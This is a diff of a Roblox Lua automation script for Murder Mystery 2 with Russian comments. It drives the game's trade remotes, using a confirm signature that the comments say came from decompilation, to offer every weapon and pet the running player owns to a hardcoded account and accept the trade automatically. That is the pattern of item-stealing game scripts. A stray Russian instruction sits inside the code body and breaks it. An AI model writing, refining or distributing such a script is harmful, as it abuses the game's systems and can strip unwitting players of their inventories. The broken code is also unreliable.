@@ -1,4 +1,4 @@
--- 🎁 MM2 AUTO MASS TRADE (WITH PROPER CONFIRM)
+-- 🎁 MM2 AUTO MASS TRADE (ИСПРАВЛЕННЫЙ)
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local Trade = ReplicatedStorage:WaitForChild("Trade", 30)
 local Players = game:GetService("Players")
@@ -8,12 +8,22 @@ if not Trade then
     return 
 end
 
-local SendRequest  = Trade:WaitForChild("SendRequest")
-local StartTrade   = Trade:WaitForChild("StartTrade")
-local UpdateTrade  = Trade:WaitForChild("UpdateTrade")
-local OfferItem    = Trade:WaitForChild("OfferItem")
-local AcceptTrade  = Trade:WaitForChild("AcceptTrade")
-local DeclineTrade = Trade:WaitForChild("DeclineTrade")
+-- ✅ ПРОВЕРКА ВСЕХ REMOTE ОБЪЕКТОВ
+local SendRequest  = Trade:FindFirstChild("SendRequest")
+local StartTrade   = Trade:FindFirstChild("StartTrade")
+local UpdateTrade  = Trade:FindFirstChild("UpdateTrade")
+local OfferItem    = Trade:FindFirstChild("OfferItem")
+local AcceptTrade  = Trade:FindFirstChild("AcceptTrade")
+local DeclineTrade = Trade:FindFirstChild("DeclineTrade")
+
+-- Проверяем что все remotes существуют
+if not SendRequest then warn("[ERROR] SendRequest не найден!"); return end
+if not StartTrade then warn("[ERROR] StartTrade не найден!"); return end
+if not UpdateTrade then warn("[ERROR] UpdateTrade не найден!"); return end
+if not OfferItem then warn("[ERROR] OfferItem не найден!"); return end
+if not AcceptTrade then warn("[ERROR] AcceptTrade не найден!"); return end
+
+print("[OK] Все Trade remotes найдены!")
 
 local TARGET_NAME = "artemka1223457"
 local MAX_UNIQUE = 4
@@ -21,29 +31,45 @@ local MAX_UNIQUE = 4
 local profileData = nil
 local currentLastOffer = nil
 local itemsGiven = {}
-local tradeStartTime = 0
-local cooldownActive = false
 
 print("[INFO] Loading ProfileData...")
 
-local success = pcall(function()
-    profileData = require(ReplicatedStorage.Modules:WaitForChild("ProfileData"))
+local success, result = pcall(function()
+    local modules = ReplicatedStorage:FindFirstChild("Modules")
+    if not modules then
+        warn("[ERROR] Modules folder not found!")
+        return nil
+    end
+    
+    local profileDataModule = modules:FindFirstChild("ProfileData")
+    if not profileDataModule then
+        warn("[ERROR] ProfileData module not found!")
+        return nil
+    end
+    
+    return require(profileDataModule)
 end)
 
-if not success or not profileData then
-    warn("[ERROR] Failed to load ProfileData") 
+if not success or not result then
+    warn("[ERROR] Failed to load ProfileData: " .. tostring(result))
     return 
 end
 
+profileData = result
 print("[OK] ProfileData loaded")
 
 -- Получение доступных предметов
 local function getAvailableItems()
     local items = {}
     
+    if not profileData then
+        warn("[ERROR] ProfileData is nil!")
+        return items
+    end
+    
     if profileData.Weapons and profileData.Weapons.Owned then
         for name, amount in pairs(profileData.Weapons.Owned) do
-            if name ~= "DefaultKnife" and name ~= "DefaultGun" then
+            if name ~= "DefaultKnife" and name ~= "DefaultGun" and type(amount) == "number" and amount > 0 then
                 local given = itemsGiven[name] or 0
                 local left = amount - given
                 if left > 0 then
@@ -55,10 +81,12 @@ local function getAvailableItems()
     
     if profileData.Pets and profileData.Pets.Owned then
         for name, amount in pairs(profileData.Pets.Owned) do
-            local given = itemsGiven[name] or 0
-            local left = amount - given
-            if left > 0 then
-                table.insert(items, {name = name, type = "Pets", left = left})
+            if type(amount) == "number" and amount > 0 then
+                local given = itemsGiven[name] or 0
+                local left = amount - given
+                if left > 0 then
+                    table.insert(items, {name = name, type = "Pets", left = left})
+                end
             end
         end
     end
@@ -66,7 +94,7 @@ local function getAvailableItems()
     return items
 end
 
--- Отслеживание LastOffer и кулдауна
+-- Отслеживание LastOffer
 UpdateTrade.OnClientEvent:Connect(function(data)
     if data and data.LastOffer then 
         currentLastOffer = data.LastOffer 
@@ -102,24 +130,34 @@ local function runTradeCycle()
     end
 
     -- Отправка запроса
-    local reqOk = pcall(function() 
-        return SendRequest:InvokeServer(target) 
-    end)
-    
-    if not reqOk then 
-        warn("[ERROR] Request failed")
-        return true 
+    if SendRequest then
+        local reqOk, err = pcall(function() 
+            return SendRequest:InvokeServer(target) 
+        end)
+        
+        if not reqOk then 
+            warn("[ERROR] Request failed: " .. tostring(err))
+            return true 
+        end
+    else
+        warn("[ERROR] SendRequest is nil!")
+        return true
     end
 
     -- Ждём StartTrade
     local started = false
     local sc
-    sc = StartTrade.OnClientEvent:Connect(function(_, pName)
-        if pName == TARGET_NAME then 
-            started = true 
-            if sc then sc:Disconnect() sc = nil end
-        end
-    end)
+    if StartTrade then
+        sc = StartTrade.OnClientEvent:Connect(function(_, pName)
+            if pName == TARGET_NAME then 
+                started = true 
+                if sc then sc:Disconnect() sc = nil end
+            end
+        end)
+    else
+        warn("[ERROR] StartTrade is nil!")
+        return true
+    end
     
     local t0 = tick()
     while not started and tick() - t0 < 10 do 
@@ -133,33 +171,36 @@ local function runTradeCycle()
     end
 
     currentLastOffer = nil
-    tradeStartTime = 0
-    cooldownActive = true
     
     print("[INFO] Trade opened. Offering items...")
 
     -- Выкладываем предметы
-    for _, it in ipairs(batch) do
-        for i = 1, it.left do
-            local ok = pcall(function() 
-                OfferItem:FireServer(it.name, it.type) 
-            end)
-            
-            if ok then
-                itemsGiven[it.name] = (itemsGiven[it.name] or 0) + 1
-                print("   [OK] " .. it.name .. " (" .. i .. "/" .. it.left .. ")")
+    if OfferItem then
+        for _, it in ipairs(batch) do
+            for i = 1, it.left do
+                local ok, err = pcall(function() 
+                    OfferItem:FireServer(it.name, it.type) 
+                end)
+                
+                if ok then
+                    itemsGiven[it.name] = (itemsGiven[it.name] or 0) + 1
+                    print("   [OK] " .. it.name .. " (" .. i .. "/" .. it.left .. ")")
+                else
+                    warn("   [ERROR] " .. it.name .. ": " .. tostring(err))
+                end
+                
+                task.wait(0.25)
             end
-            
-            task.wait(0.25)
         end
+    else
+        warn("[ERROR] OfferItem is nil!")
     end
-сделай без req
-    -- Ждём кулдаун (6 секунд из декомпиляции)
+    
+    -- Ждём кулдаун
     print("[INFO] Waiting 6s cooldown...")
     task.wait(6)
-    cooldownActive = false
     
-    -- Ждём LastOffer если ещё не получен
+    -- Ждём LastOffer
     if not currentLastOffer then
         print("[INFO] Waiting for LastOffer...")
         local t1 = tick()
@@ -168,31 +209,35 @@ local function runTradeCycle()
         end
     end
 
-    if currentLastOffer then
-        -- ВАЖНО: Сначала ждём 0.5 сек (как в оригинале 0.4)
+    if currentLastOffer and AcceptTrade then
         print("[INFO] Waiting 0.5s before confirm...")
         task.wait(0.5)
         
         print("[INFO] Confirming trade...")
-        local confirmOk = pcall(function()
-            -- Точная сигнатура из декомпиляции
+        local confirmOk, err = pcall(function()
             AcceptTrade:FireServer(game.PlaceId * 3, currentLastOffer)
         end)
         
         if not confirmOk then
-            warn("[ERROR] Confirm failed")
+            warn("[ERROR] Confirm failed: " .. tostring(err))
         end
     else
-        warn("[WARN] No LastOffer received")
+        if not AcceptTrade then
+            warn("[ERROR] AcceptTrade is nil!")
+        else
+            warn("[WARN] No LastOffer received")
+        end
     end
 
     -- Ждём завершения
     local done = false
     local ac
-    ac = AcceptTrade.OnClientEvent:Connect(function() 
-        done = true 
-        if ac then ac:Disconnect() ac = nil end
-    end)
+    if AcceptTrade then
+        ac = AcceptTrade.OnClientEvent:Connect(function() 
+            done = true 
+            if ac then ac:Disconnect() ac = nil end
+        end)
+    end
     
     local t2 = tick()
     while not done and tick() - t2 < 15 do 
